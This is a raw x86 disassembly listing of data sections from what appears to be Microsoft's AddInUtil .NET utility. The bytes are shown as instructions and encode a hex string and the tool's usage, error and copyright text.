  406cf4:	xor    BYTE PTR [eax],dh
  406cf6:	ss popa 
  406cf8:	arpl   WORD PTR [ebx+0x38],sp
  406cfb:	bound  esi,QWORD PTR ds:0x66393539
  406d01:	xor    ah,BYTE PTR [edx+0x64]
  406d04:	ss xor DWORD PTR gs:[eax],esi
  406d08:	xor    esi,DWORD PTR gs:[esi]
  406d0b:	xor    BYTE PTR [ebx+0x33],ah
  406d0e:	xor    al,0x35
  406d10:	xor    esi,DWORD PTR [edi]
  406d12:	popa   
  406d13:	xor    DWORD PTR [edx+esi*1+0x36],esp
  406d17:	ss fs popa 
  406d1a:	cmp    BYTE PTR [eax],dh
  406d1c:	cmp    BYTE PTR ds:0x35363538,dh
  406d22:	cmp    BYTE PTR [ebx],dh
  406d24:	arpl   WORD PTR [eax],di
  406d26:	xor    eax,0x64313864
  406d2b:	popa   
  406d2c:	aaa    
  406d2d:	xor    sp,WORD PTR [ebp+0x63]
  406d31:	xor    BYTE PTR [ecx],dh
  406d33:	gs cmp DWORD PTR fs:0x35633436,esi
  406d3b:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  406d3f:	fs aaa 
  406d41:	xor    DWORD PTR [ebx],esi
  406d43:	arpl   WORD PTR [eax+esi*1+0x31],sp
  406d47:	aaa    
  406d48:	xor    ah,BYTE PTR [ebx+0x38]
  406d4b:	xor    dh,BYTE PTR gs:[ebx]
  406d4e:	popa   
  406d4f:	xor    DWORD PTR [eax],esi
  406d51:	data16 xor BYTE PTR [edx],dh
  406d54:	xor    edi,DWORD PTR [ecx]
  406d56:	bound  edi,QWORD PTR [eax]
  406d58:	xor    BYTE PTR [ebx+0x39],ah
  406d5b:	bound  esi,QWORD PTR ss:[eax]
  406d5e:	aaa    
  406d5f:	aaa    
  406d60:	xor    esi,DWORD PTR [esi]
  406d62:	xor    ax,0x3864
  406d66:	bound  esi,QWORD PTR [eax]
  406d68:	xor    dh,BYTE PTR [edx]
  406d6a:	xor    eax,0x34613234
  406d6f:	gs aaa 
  406d71:	xor    al,0x32
  406d73:	xor    eax,0x66356131
  406d78:	xor    al,0x33
  406d7a:	xor    bh,BYTE PTR [eax]
  406d7c:	xor    dh,BYTE PTR [ebx+esi*1]
  406d7f:	xor    DWORD PTR [eax],edi
  406d81:	bound  esi,QWORD PTR [ebx]
  406d83:	xor    eax,0x35613933
  406d88:	popa   
  406d89:	xor    BYTE PTR [eax],bh
  406d8b:	aaa    
  406d8c:	data16 cmp BYTE PTR [ebp+0x35],ah
  406d90:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  406d94:	xor    DWORD PTR [ebx],esi
  406d96:	xor    eax,0x61633966
  406d9b:	xor    al,0x37
  406d9d:	xor    sp,WORD PTR [edx+0x62]
  406da1:	xor    ah,BYTE PTR [ebp+0x31]
  406da4:	xor    BYTE PTR [ecx+0x66],ah
  406da7:	data16 xor BYTE PTR [ecx+0x66],ah
  406dab:	xor    BYTE PTR [eax],bh
  406dad:	xor    al,0x39
  406daf:	xor    eax,0x62663430
  406db4:	aaa    
  406db5:	arpl   WORD PTR [ebp+0x61],sp
  406db8:	xor    esp,DWORD PTR [esi+0x66]
  406dbb:	xor    DWORD PTR [ecx],edi
  406dbd:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  406dc1:	fs xor BYTE PTR gs:[ebp+0x64],ah
  406dc6:	popa   
  406dc7:	fs ss xor al,0x63
  406dcb:	cmp    BYTE PTR ss:[ebp+0x66],ah
  406dcf:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  406dd4:	xor    eax,0x30336436
  406dd9:	xor    ah,BYTE PTR [ecx+0x64]
  406ddc:	xor    eax,0x36646635
  406de1:	cmp    BYTE PTR gs:[eax],dh
  406de4:	xor    si,WORD PTR [eax]
  406de7:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  406deb:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  406df0:	cmp    DWORD PTR gs:0x38353633,esi
  406df7:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  406dff:	bound  esi,QWORD PTR ds:0x63363366
  406e05:	xor    eax,0x66653234
  406e0a:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  406e0f:	data16 cmp BYTE PTR [eax],bh
  406e12:	cmp    BYTE PTR ds:0x33643833,dh
  406e18:	aaa    
  406e19:	xor    al,0x63
  406e1b:	xor    WORD PTR gs:[eax],si
  406e1f:	ss popa 
  406e21:	arpl   WORD PTR [esi+0x37],sp
  406e24:	cmp    DWORD PTR fs:[ebx],esi
  406e27:	popa   
  406e28:	xor    al,0x34
  406e2a:	xor    al,0x35
  406e2c:	arpl   WORD PTR [ebx],si
  406e2e:	arpl   WORD PTR [edi],si
  406e30:	xor    esp,DWORD PTR [ebx+0x64]
  406e33:	cmp    DWORD PTR [ecx],esi
  406e35:	xor    DWORD PTR [esi+0x30],esp
  406e38:	xor    eax,0x61613137
  406e3d:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  406e42:	fs popa 
  406e44:	xor    DWORD PTR [edx],esi
  406e46:	bound  esi,QWORD PTR [ecx]
  406e48:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  406e4c:	arpl   WORD PTR [ebx],si
  406e4e:	aaa    
  406e4f:	xor    eax,0x813362
  406e54:	popa   
  406e55:	xor    eax,0x36363861
  406e5a:	xor    DWORD PTR gs:[ebp+0x65],esp
  406e5e:	xor    DWORD PTR [eax],edi
  406e60:	data16 cmp BYTE PTR ss:[eax],dh
  406e64:	aaa    
  406e65:	ss cmp BYTE PTR ss:[edx],dh
  406e69:	xor    BYTE PTR [ecx],bh
  406e6b:	xor    sp,WORD PTR [edx+0x31]
  406e6f:	xor    DWORD PTR [edx],esi
  406e71:	xor    esi,DWORD PTR [esi]
  406e73:	popa   
  406e74:	arpl   WORD PTR [ebp+0x35],sp
  406e77:	xor    dh,BYTE PTR gs:[ecx]
  406e7a:	xor    WORD PTR [ecx],si
  406e7d:	aaa    
  406e7e:	cmp    BYTE PTR [eax],dh
  406e80:	xor    esp,DWORD PTR [ecx+0x33]
  406e83:	xor    DWORD PTR [ebx+esi*1],esi
  406e86:	popa   
  406e87:	bound  esp,QWORD PTR [edx+0x31]
  406e8a:	xor    dh,BYTE PTR [esi]
  406e8c:	fs xor BYTE PTR fs:[ebx],dh
  406e90:	xor    eax,0x32643764
  406e95:	data16 cmp BYTE PTR [edi],dh
  406e98:	bound  esi,QWORD PTR ss:[esi]
  406e9b:	cmp    DWORD PTR [ebx],esi
  406e9d:	cmp    BYTE PTR [ecx+0x61],ah
  406ea0:	data16 xor ah,BYTE PTR [ebp+0x65]
  406ea4:	xor    esi,DWORD PTR [ecx+esi*1]
  406ea7:	xor    al,0x64
  406ea9:	xor    eax,0x64303234
  406eae:	aaa    
  406eaf:	xor    eax,0x31323633
  406eb4:	xor    al,0x30
  406eb6:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  406eba:	xor    al,0x61
  406ebc:	xor    al,0x39
  406ebe:	arpl   WORD PTR [eax+edi*1],si
  406ec1:	arpl   WORD PTR ss:[ebp+0x31],sp
  406ec5:	xor    esi,DWORD PTR [ebx+esi*1]
  406ec8:	xor    BYTE PTR [eax],dh
  406eca:	popa   
  406ecb:	xor    dh,BYTE PTR [ecx]
  406ecd:	xor    BYTE PTR [esi],dh
  406ecf:	popa   
  406ed0:	bound  esi,QWORD PTR fs:[esi]
  406ed3:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  406ed7:	xor    esi,DWORD PTR [ebx]
  406ed9:	xor    eax,0x65663039
  406ede:	data16 cmp BYTE PTR [ecx+0x64],ah
  406ee2:	xor    eax,0x63333463
  406ee7:	bound  esp,QWORD PTR [ecx+0x38]
  406eea:	xor    dh,BYTE PTR [edx]
  406eec:	cmp    DWORD PTR [eax],esi
  406eee:	arpl   WORD PTR fs:[ecx+edi*1],si
  406ef2:	xor    eax,0x66653033
  406ef7:	data16 cmp BYTE PTR fs:[esi],dh
  406efb:	xor    eax,0x39643332
  406f00:	xor    al,0x38
  406f02:	xor    esp,DWORD PTR [ebx+0x30]
  406f05:	xor    BYTE PTR [esi+0x34],ah
  406f08:	xor    eax,0x34666138
  406f0d:	cmp    BYTE PTR ss:[ecx],bh
  406f10:	xor    BYTE PTR [eax],dh
  406f12:	xor    esi,DWORD PTR [esi]
  406f14:	bound  esi,QWORD PTR [eax]
  406f16:	xor    ah,BYTE PTR gs:[ebx+0x36]
  406f1a:	xor    DWORD PTR [eax+esi*1+0x37],esp
  406f1e:	aaa    
  406f1f:	fs aaa 
  406f21:	bound  sp,DWORD PTR [ecx+0x63]
  406f25:	xor    al,0x36
  406f27:	aaa    
  406f28:	popa   
  406f29:	xor    eax,0x62653630
  406f2e:	popa   
  406f2f:	xor    bh,BYTE PTR [ecx]
  406f31:	gs xor al,0x36
  406f34:	aaa    
  406f35:	popa   
  406f36:	cmp    BYTE PTR [edi],dh
  406f38:	xor    DWORD PTR [ecx],edi
  406f3a:	cmp    BYTE PTR [edx+0x30],ah
  406f3d:	xor    eax,0x34376333
  406f42:	cmp    DWORD PTR [ecx+0x61],esp
  406f45:	xor    ah,BYTE PTR [ecx+0x34]
  406f48:	xor    bh,BYTE PTR fs:[eax]
  406f4b:	xor    al,0x30
  406f4d:	arpl   WORD PTR [edi],si
  406f4f:	cmp    BYTE PTR [eiz*2+0x6436],dh
  406f56:	push   ds
  406f57:	add    DWORD PTR [eax],eax
  406f59:	add    DWORD PTR [eax],eax
  406f5b:	push   esp
  406f5c:	add    dl,BYTE PTR [esi]
  406f5e:	push   edi
  406f5f:	jb     0x406fc2
  406f61:	jo     0x406fb1
  406f63:	outs   dx,DWORD PTR ds:[esi]
  406f64:	outs   dx,BYTE PTR ds:[esi]
  406f65:	inc    ebp
  406f66:	js     0x406fcb
  406f68:	gs jo  0x406fdf
  406f6b:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  406f72:	ja     0x406fe7
  406f74:	add    DWORD PTR [eax],ecx
  406f76:	add    DWORD PTR [eax],eax
  406f78:	add    eax,DWORD PTR [eax]
  406f7a:	add    BYTE PTR [eax],al
  406f7c:	add    BYTE PTR [eax],al
  406f7e:	inc    eax
  406f7f:	add    DWORD PTR [eax],eax
  406f81:	xor    cl,BYTE PTR [ebp+0x69]
  406f84:	arpl   WORD PTR [edx+0x6f],si
  406f87:	jae    0x406ff8
  406f89:	data16 je 0x406fba
  406f8c:	inc    edx
  406f8d:	jne    0x406ff8
  406f8f:	ins    BYTE PTR es:[edi],dx
  406f90:	fs cs push esp
  406f93:	popa   
  406f94:	jae    0x407001
  406f96:	jae    0x406fc6
  406f98:	push   ebx
  406f99:	je     0x40700d
  406f9b:	outs   dx,DWORD PTR ds:[esi]
  406f9c:	outs   dx,BYTE PTR ds:[esi]
  406f9d:	ins    BYTE PTR es:[di],dx
  406f9f:	jns    0x406ff5
  406fa1:	jns    0x407013
  406fa3:	gs fs push edx
  406fa6:	gs jae 0x407018
  406fa9:	jne    0x40701d
  406fab:	arpl   WORD PTR [ebp+0x42],sp
  406fae:	jne    0x407019
  406fb0:	ins    BYTE PTR es:[edi],dx
  406fb1:	fs gs jb 0x406fbd
  406fb5:	xor    DWORD PTR [esi+ebp*1],esi
  406fb8:	xor    BYTE PTR [esi],ch
  406fba:	xor    BYTE PTR [esi],ch
  406fbc:	xor    BYTE PTR [eax],al
  406fbe:	add    BYTE PTR [ecx+eax*1],al
  406fc1:	add    BYTE PTR [eax],al
  406fc3:	add    BYTE PTR [esi+eax*1+0x0],cl
  406fc7:	add    dh,cl
  406fc9:	retf   0xbeef
  406fcc:	add    DWORD PTR [eax],eax
  406fce:	add    BYTE PTR [eax],al
  406fd0:	xchg   ecx,eax
  406fd1:	add    BYTE PTR [eax],al
  406fd3:	add    BYTE PTR [ebx+edx*2+0x79],ch
  406fd7:	jae    0x40704d
  406fd9:	gs ins DWORD PTR es:[edi],dx
  406fdb:	cs push edx
  406fdd:	gs jae 0x40704f
  406fe0:	jne    0x407054
  406fe2:	arpl   WORD PTR [ebp+0x73],sp
  406fe5:	cs push edx
  406fe7:	gs jae 0x407059
  406fea:	jne    0x40705e
  406fec:	arpl   WORD PTR [ebp+0x52],sp
  406fef:	gs popa 
  406ff1:	fs gs jb 0x407021
  406ff5:	and    BYTE PTR [ebp+0x73],ch
  406ff8:	arpl   WORD PTR [edi+0x72],bp
  406ffb:	ins    BYTE PTR es:[edi],dx
  406ffc:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  407003:	jae    0x40706e
  407005:	outs   dx,DWORD PTR ds:[esi]
  407006:	outs   dx,BYTE PTR ds:[esi]
  407007:	cmp    eax,0x2e302e34
  40700c:	xor    BYTE PTR [esi],ch
  40700e:	xor    BYTE PTR [eax+eiz*1],ch
  407011:	inc    ebx
  407012:	jne    0x407080
  407014:	je     0x40708b
  407016:	jb     0x40707d
  407018:	cmp    eax,0x7475656e
  40701d:	jb     0x407080
  40701f:	ins    BYTE PTR es:[edi],dx
  407020:	sub    al,0x20
  407022:	push   eax
  407023:	jne    0x407087
  407025:	ins    BYTE PTR es:[edi],dx
  407026:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  40702d:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  407031:	bound  esi,QWORD PTR [edi]
  407033:	aaa    
  407034:	popa   
  407035:	xor    eax,0x31363563
  40703a:	cmp    DWORD PTR [ebx],esi
  40703c:	xor    al,0x65
  40703e:	xor    BYTE PTR [eax],bh
  407040:	cmp    DWORD PTR [ebx],esp
  407042:	push   ebx
  407043:	jns    0x4070b8
  407045:	je     0x4070ac
  407047:	ins    DWORD PTR es:[edi],dx
  407048:	cs push edx
  40704a:	gs jae 0x4070bc
  40704d:	jne    0x4070c1
  40704f:	arpl   WORD PTR [ebp+0x73],sp
  407052:	cs push edx
  407054:	jne    0x4070c4
  407056:	je     0x4070c1
  407058:	ins    DWORD PTR es:[edi],dx
  407059:	gs push edx
  40705b:	gs jae 0x4070cd
  40705e:	jne    0x4070d2
  407060:	arpl   WORD PTR [ebp+0x53],sp
  407063:	gs je  0x407068
  407066:	add    BYTE PTR [eax],al
  407068:	add    BYTE PTR [ecx],cl
  40706a:	add    BYTE PTR [eax],al
  40706c:	add    BYTE PTR [eax],al
  40706e:	add    BYTE PTR [eax],al
  407070:	add    BYTE PTR [eax+0x41],dl
  407073:	inc    esp
  407074:	push   eax
  407075:	inc    ecx
  407076:	inc    esp
  407077:	push   eax
  407078:	dec    esp
  407079:	dec    ebp
  40707a:	loope  0x407007
  40707c:	dec    edi
  40707d:	dec    ebp
  40707e:	loope  0x40700b
  407080:	mov    dh,0x3e
  407082:	cmp    DWORD PTR [ebx-0x31098487],ebx
  407088:	fs aaa 
  40708a:	sbb    eax,0xec82000
  40708f:	or     eax,0x451d0a92
  407094:	iret   
  407095:	mov    ebp,0xc82578cc
  40709a:	jg     0x407118
  40709c:	or     eax,0x1e000000
  4070a1:	add    BYTE PTR [eax],al
  4070a3:	add    BYTE PTR [esi+0x0],bh
  4070a6:	add    BYTE PTR [eax],al
  4070a8:	mov    edi,0xda000000
  4070ad:	add    BYTE PTR [eax],al
  4070af:	add    bh,bh
  4070b1:	add    BYTE PTR [eax],al
  4070b3:	add    BYTE PTR [edi],ch
  4070b5:	add    BYTE PTR [eax],al
  4070b7:	add    BYTE PTR [esi],cl
  4070b9:	add    DWORD PTR [eax],eax
  4070bb:	add    BYTE PTR [eax],al
  4070bd:	add    BYTE PTR [eax],al
  4070bf:	add    BYTE PTR ds:0x8000002,bl
  4070c5:	inc    esp
  4070c6:	add    BYTE PTR [edi+0x0],ch
  4070c9:	outs   dx,BYTE PTR ds:[esi]
  4070ca:	add    BYTE PTR [ebp+0x0],ah
  4070cd:	add    BYTE PTR [eax],al
  4070cf:	add    BYTE PTR [eax],al
  4070d1:	or     al,0x45
  4070d3:	add    BYTE PTR [edx+0x0],dh
  4070d6:	jb     0x4070d8
  4070d8:	outs   dx,DWORD PTR ds:[esi]
  4070d9:	add    BYTE PTR [edx+0x0],dh
  4070dc:	xor    DWORD PTR [eax],eax
  4070de:	sbb    al,BYTE PTR [eax]
  4070e0:	add    BYTE PTR [eax],al
  4070e2:	or     al,0x45
  4070e4:	add    BYTE PTR [edx+0x0],dh
  4070e7:	jb     0x4070e9
  4070e9:	outs   dx,DWORD PTR ds:[esi]
  4070ea:	add    BYTE PTR [edx+0x0],dh
  4070ed:	xor    al,BYTE PTR [eax]
  4070ef:	add    BYTE PTR es:[eax],al
  4070f2:	add    BYTE PTR [edx+0x4d],cl
  4070f5:	add    BYTE PTR [ebp+0x0],dh
  4070f8:	jae    0x4070fa
  4070fa:	je     0x4070fc
  4070fc:	dec    esi
  4070fd:	add    BYTE PTR [edi+0x0],ch
  407100:	je     0x407102
  407102:	push   ebx
  407103:	add    BYTE PTR [eax+0x0],dh
  407106:	add    BYTE PTR gs:[ebx+0x0],ah
  40710a:	imul   eax,DWORD PTR [eax],0x790066
  407110:	inc    edx
  407111:	add    BYTE PTR [edi+0x0],ch
  407114:	je     0x407116
  407116:	push   0x69005000
  40711b:	add    BYTE PTR [eax+0x0],dh
  40711e:	add    BYTE PTR gs:[eax+eax*1+0x69],ch
  407123:	add    BYTE PTR [esi+0x0],ch
  407126:	add    BYTE PTR gs:[edi+0x0],cl
  40712a:	jb     0x40712c
  40712c:	inc    ecx
  40712d:	add    BYTE PTR [eax+eax*1+0x64],ah
  407131:	add    BYTE PTR [ecx+0x0],cl
  407134:	outs   dx,BYTE PTR ds:[esi]
  407135:	add    BYTE PTR [edx+0x0],dl
  407138:	outs   dx,DWORD PTR ds:[esi]
  407139:	add    BYTE PTR [edi+0x0],ch
  40713c:	je     0x40713e
  40713e:	aaa    
  40713f:	add    BYTE PTR [eax],al
  407141:	add    BYTE PTR [ecx*2+0x73007500],bh
  407148:	add    BYTE PTR [eax+eax*1+0x53],dh
  40714c:	add    BYTE PTR [eax+0x0],dh
  40714f:	add    BYTE PTR gs:[ebx+0x0],ah
  407153:	imul   eax,DWORD PTR [eax],0x790066
  407159:	push   eax
  40715a:	add    BYTE PTR [ecx+0x0],ch
  40715d:	jo     0x40715f
  40715f:	add    BYTE PTR gs:[eax+eax*1+0x69],ch
  407164:	add    BYTE PTR [esi+0x0],ch
  407167:	add    BYTE PTR gs:[edi+0x0],cl
  40716b:	jb     0x40716d
  40716d:	inc    ecx
  40716e:	add    BYTE PTR [eax+eax*1+0x64],ah
  407172:	add    BYTE PTR [ecx+0x0],cl
  407175:	outs   dx,BYTE PTR ds:[esi]
  407176:	add    BYTE PTR [edx+0x0],dl
  407179:	outs   dx,DWORD PTR ds:[esi]
  40717a:	add    BYTE PTR [edi+0x0],ch
  40717d:	je     0x40717f
  40717f:	mov    al,BYTE PTR [eax]
  407181:	add    BYTE PTR [eax],al
  407183:	push   ss
  407184:	push   eax
  407185:	add    BYTE PTR [ecx+0x0],ah
  407188:	je     0x40718a
  40718a:	push   0x6e004900
  40718f:	add    BYTE PTR [esi+0x0],dh
  407192:	popa   
  407193:	add    BYTE PTR [eax+eax*1+0x69],ch
  407197:	add    BYTE PTR [eax+eax*1-0x2a],ah
  40719b:	add    BYTE PTR [eax],al
  40719d:	add    BYTE PTR [eax],ah
  40719f:	push   ebp
  4071a0:	add    BYTE PTR [esi+0x0],ch
  4071a3:	imul   eax,DWORD PTR [eax],0x6e
  4071a6:	add    BYTE PTR [edi+0x0],ch
  4071a9:	ja     0x4071ab
  4071ab:	outs   dx,BYTE PTR ds:[esi]
  4071ac:	add    BYTE PTR [eax+0x0],dl
  4071af:	popa   
  4071b0:	add    BYTE PTR [edx+0x0],dh
  4071b3:	popa   
  4071b4:	add    BYTE PTR [ebp+0x0],ch
  4071b7:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  4071bc:	add    BYTE PTR [edx+0x0],dh
  4071bf:	or     BYTE PTR [ecx],al
  4071c1:	add    BYTE PTR [eax],al
  4071c3:	or     dl,BYTE PTR [ebp+0x0]
  4071c6:	jae    0x4071c8
  4071c8:	popa   
  4071c9:	add    BYTE PTR [edi+0x0],ah
  4071cc:	add    BYTE PTR gs:[ebx],bh
  4071cf:	add    DWORD PTR [eax],eax
  4071d1:	add    BYTE PTR [esi],cl
  4071d3:	push   edi
  4071d4:	add    BYTE PTR [ecx+0x0],ah
  4071d7:	jb     0x4071d9
  4071d9:	outs   dx,BYTE PTR ds:[esi]
  4071da:	add    BYTE PTR [ecx+0x0],ch
  4071dd:	outs   dx,BYTE PTR ds:[esi]
  4071de:	add    BYTE PTR [edi+0x0],ah
  4071e1:	and    DWORD PTR [eax+eax*1],eax
  4071e4:	add    BYTE PTR [ecx],al
  4071e6:	sbb    BYTE PTR [esi+0x69],al
  4071e9:	outs   dx,BYTE PTR ds:[esi]
  4071ea:	imul   esi,DWORD PTR [ebx+0x68],0x75206465
  4071f1:	jo     0x407257
  4071f3:	popa   
  4071f4:	je     0x40725f
  4071f6:	outs   dx,BYTE PTR ds:[esi]
  4071f7:	and    BYTE PTR [bp+di+0x61],ah
  4071fb:	arpl   WORD PTR [eax+0x65],bp
  4071fe:	and    BYTE PTR [ecx],al
  407200:	or     al,BYTE PTR [ebp+0x72]
  407203:	jb     0x407274
  407205:	jb     0x407241
  407207:	and    BYTE PTR [ebx+0x30],bh
  40720a:	jge    0x40720d
  40720c:	cmovne esi,DWORD PTR [edx+0x72]
  407210:	outs   dx,DWORD PTR ds:[esi]
  407211:	jb     0x40724d
  407213:	and    BYTE PTR [ebx+0x30],bh
  407216:	jge    0x407252
  407218:	and    BYTE PTR [ebx+0x31],bh
  40721b:	jge    0x40721e
  40721d:	push   ecx
  40721e:	inc    ebp
  40721f:	jb     0x407293
  407221:	outs   dx,DWORD PTR ds:[esi]
  407222:	jb     0x40725e
  407224:	and    BYTE PTR [ebx+0x70],dl
  407227:	arpl   WORD PTR gs:[ecx+0x66],bp
  40722b:	jns    0x40724d
  40722d:	je     0x407297
  40722f:	and    BYTE PTR gs:[eax+0x69],dl
  407233:	jo     0x40729a
  407235:	ins    BYTE PTR es:[edi],dx
  407236:	imul   ebp,DWORD PTR [esi+0x65],0x746f6f52
  40723d:	and    BYTE PTR [edi+0x72],ch
  407240:	and    BYTE PTR [eax+ebp*2+0x65],dh
  407244:	and    BYTE PTR [ecx+0x64],al
  407247:	fs dec ecx
  407249:	outs   dx,BYTE PTR ds:[esi]
  40724a:	push   edx
  40724b:	outs   dx,DWORD PTR ds:[esi]
  40724c:	outs   dx,DWORD PTR ds:[esi]
  40724d:	je     0x40727b
  40724f:	and    BYTE PTR [edx+0x75],ah
  407252:	je     0x407274
  407254:	outs   dx,BYTE PTR ds:[esi]
  407255:	outs   dx,DWORD PTR ds:[esi]
  407256:	je     0x407278
  407258:	bound  ebp,QWORD PTR [edi+0x74]
  40725b:	push   0x5520202e
  407260:	jae    0x4072c7
  407262:	and    BYTE PTR ds:0x6f66203f,ch
  407268:	jb     0x40728a
  40726a:	push   0x2e706c65
  40726f:	add    DWORD PTR [edx+0x45],ecx
  407272:	jb     0x4072e6
  407274:	outs   dx,DWORD PTR ds:[esi]
  407275:	jb     0x4072b1
  407277:	and    BYTE PTR [ebx+0x70],dl
  40727a:	arpl   WORD PTR gs:[ecx+0x66],bp
  40727e:	jns    0x4072a0
  407280:	imul   esi,DWORD PTR gs:[eax+ebp*2+0x65],0x68742072
  407289:	and    BYTE PTR gs:[eax+0x69],dl
  40728d:	jo     0x4072f4
  40728f:	ins    BYTE PTR es:[edi],dx
  407290:	imul   ebp,DWORD PTR [esi+0x65],0x746f6f52
  407297:	and    BYTE PTR [edi+0x72],ch
  40729a:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40729e:	and    BYTE PTR [ecx+0x64],al
  4072a1:	fs dec ecx
  4072a3:	outs   dx,BYTE PTR ds:[esi]
  4072a4:	push   edx
  4072a5:	outs   dx,DWORD PTR ds:[esi]
  4072a6:	outs   dx,DWORD PTR ds:[esi]
  4072a7:	je     0x4072d7
  4072a9:	and    BYTE PTR [eax],ah
  4072ab:	push   ebp
  4072ac:	jae    0x407313
  4072ae:	and    BYTE PTR ds:0x6f66203f,ch
  4072b4:	jb     0x4072d6
  4072b6:	push   0x2e706c65
  4072bb:	add    DWORD PTR [eax],esi
  4072bd:	inc    ebp
  4072be:	jb     0x407332
  4072c0:	outs   dx,DWORD PTR ds:[esi]
  4072c1:	jb     0x4072fd
  4072c3:	and    BYTE PTR [eax+ebp*2+0x65],dl
  4072c7:	and    BYTE PTR [eax+0x61],dh
  4072ca:	je     0x407334
  4072cc:	and    BYTE PTR [ebx+0x70],dh
  4072cf:	arpl   WORD PTR gs:[ecx+0x66],bp
  4072d3:	imul   esp,DWORD PTR [ebp+0x64],0x307b2220
  4072da:	jge    0x4072fe
  4072dc:	and    BYTE PTR [ecx+0x73],ch
  4072df:	and    BYTE PTR [ecx+0x6e],ch
  4072e2:	jbe    0x407345
  4072e4:	ins    BYTE PTR es:[edi],dx
  4072e5:	imul   esp,DWORD PTR [esi+ebp*1+0x20],0x7d317b20
  4072ed:	add    DWORD PTR [ecx],esi
  4072ef:	inc    ebp
  4072f0:	jb     0x407364
  4072f2:	outs   dx,DWORD PTR ds:[esi]
  4072f3:	jb     0x40732f
  4072f5:	and    BYTE PTR [ebp+0x6e],dl
  4072f8:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  4072fc:	outs   dx,BYTE PTR ds:[esi]
  4072fd:	and    BYTE PTR [eax+0x61],dh
  407300:	jb     0x407363
  407302:	ins    DWORD PTR es:[edi],dx
  407303:	gs je  0x40736b
  407306:	jb     0x407328
  407308:	and    bh,BYTE PTR [ebx+0x30]
  40730b:	jge    0x40732f
  40730d:	and    BYTE PTR cs:[eax],ah
  407310:	push   ebp
  407311:	jae    0x407378
  407313:	and    BYTE PTR ds:0x6f66203f,ch
  407319:	jb     0x40733b
  40731b:	push   0x2e706c65
  407320:	add    ebx,esp
  407322:	add    eax,0x7263694d
  407327:	outs   dx,DWORD PTR ds:[esi]
  407328:	jae    0x407399
  40732a:	data16 je 0x40734d
  40732d:	sub    BYTE PTR [edx+0x29],dl
  407330:	and    BYTE PTR [ecx+0x64],al
  407333:	fs sub eax,0x64206e49
  407339:	gs jo  0x4073a8
  40733c:	outs   dx,DWORD PTR ds:[esi]
  40733d:	jns    0x4073ac
  40733f:	outs   dx,BYTE PTR gs:[esi]
  407341:	je     0x407363
  407343:	arpl   WORD PTR [ecx+0x63],sp
  407346:	push   0x70752065
  40734b:	fs popa 
  40734d:	je     0x4073b8
  40734f:	outs   dx,BYTE PTR ds:[esi]
  407350:	and    BYTE PTR [di+0x74],dh
  407354:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x65762079
  40735c:	jb     0x4073d1
  40735e:	imul   ebp,DWORD PTR [edi+0x6e],0x7d307b20
  407365:	or     eax,0x706f430a
  40736a:	jns    0x4073de
  40736c:	imul   esp,DWORD PTR [edi+0x68],0x43282074
  407373:	sub    DWORD PTR [eax],esp
  407375:	dec    ebp
  407376:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40737d:	je     0x40739f
  40737f:	inc    ebx
  407380:	outs   dx,DWORD PTR ds:[esi]
  407381:	jb     0x4073f3
  407383:	outs   dx,DWORD PTR ds:[esi]
  407384:	jb     0x4073e7
  407386:	je     0x4073f1
  407388:	outs   dx,DWORD PTR ds:[esi]
  407389:	outs   dx,BYTE PTR ds:[esi]
  40738a:	and    BYTE PTR cs:[ecx+0x6c],al
  40738e:	ins    BYTE PTR es:[edi],dx
  40738f:	and    BYTE PTR [edx+0x69],dh
  407392:	addr16 push 0x72207374
  407398:	gs jae 0x407400
  40739b:	jb     0x407413
  40739d:	gs fs cs or eax,0x410a0d0a
  4073a5:	fs fs dec ecx
  4073a8:	outs   dx,BYTE PTR ds:[esi]
  4073a9:	push   ebp
  4073aa:	je     0x407415
  4073ac:	ins    BYTE PTR es:[edi],dx
  4073ad:	and    BYTE PTR [ebx+0x2d],bl
  4073b0:	push   eax
  4073b1:	imul   esi,DWORD PTR [eax+0x65],0x656e696c
  4073b8:	push   edx
  4073b9:	outs   dx,DWORD PTR ds:[esi]
  4073ba:	outs   dx,DWORD PTR ds:[esi]
  4073bb:	je     0x4073f7
  4073bd:	cmp    al,0x70
  4073bf:	popa   
  4073c0:	je     0x40742a
  4073c2:	ds pop ebp
  4073c4:	and    BYTE PTR [ebx+0x2d],bl
  4073c7:	inc    ecx
  4073c8:	fs fs dec ecx
  4073cb:	outs   dx,BYTE PTR ds:[esi]
  4073cc:	push   edx
  4073cd:	outs   dx,DWORD PTR ds:[esi]
  4073ce:	outs   dx,DWORD PTR ds:[esi]
  4073cf:	je     0x40740b
  4073d1:	cmp    al,0x70
  4073d3:	popa   
  4073d4:	je     0x40743e
  4073d6:	ds pop ebp
  4073d8:	and    BYTE PTR [ebx+0x2d],bl
  4073db:	push   edx
  4073dc:	bound  esi,QWORD PTR gs:[ebp+0x69]
  4073e0:	ins    BYTE PTR es:[edi],dx
  4073e1:	fs pop ebp
  4073e3:	and    BYTE PTR [ebx+0x2d],bl
  4073e6:	push   ebx
  4073e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0xa0d5d74
  4073ef:	or     eax,0x6968540a
  4073f4:	jae    0x407416
  4073f6:	je     0x407467
  4073f8:	outs   dx,DWORD PTR ds:[esi]
  4073f9:	ins    BYTE PTR es:[edi],dx
  4073fa:	and    BYTE PTR [ebp+0x70],dh
  4073fd:	fs popa 
  4073ff:	je     0x407466
  407401:	jae    0x407423
  407403:	je     0x40746d
  407405:	and    BYTE PTR gs:[ebx+0x61],ah
